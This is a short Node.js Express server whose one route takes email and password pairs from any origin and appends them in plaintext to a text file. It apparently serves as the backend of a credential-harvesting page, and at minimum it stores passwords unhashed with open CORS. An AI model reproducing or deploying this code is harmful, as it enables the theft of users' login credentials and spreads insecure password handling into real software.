const express = require('express');
const path = require('path');
const fs = require('fs');
const cors = require('cors'); // Import CORS
const app = express();
const PORT = process.env.PORT || 3000;

// Use CORS middleware
app.use(cors());

// Middleware to parse JSON bodies
app.use(express.json());

// Serve static files from the "public" directory
app.use(express.static(path.join(__dirname, 'public')));

// Route to handle form submissions
app.post('/save', (req, res) => {
  const { email, password } = req.body;

  if (!email || !password) {
    return res.status(400).send('Email and password are required');
  }

  // Format the data to save
  const data = `Email: ${email}, Password: ${password}\n`;

  // Append the data to a file called 'data.txt'
  fs.appendFile('data.txt', data, (err) => {
    if (err) {
      console.error('Error saving data:', err);
      return res.status(500).send('Error saving data');
    }

    console.log('Data saved successfully!');
    res.status(200).send('Data saved successfully!');
  });
});

// Start the server
app.listen(PORT, () => {
  console.log(`Server running on http://localhost:${PORT}`);
});
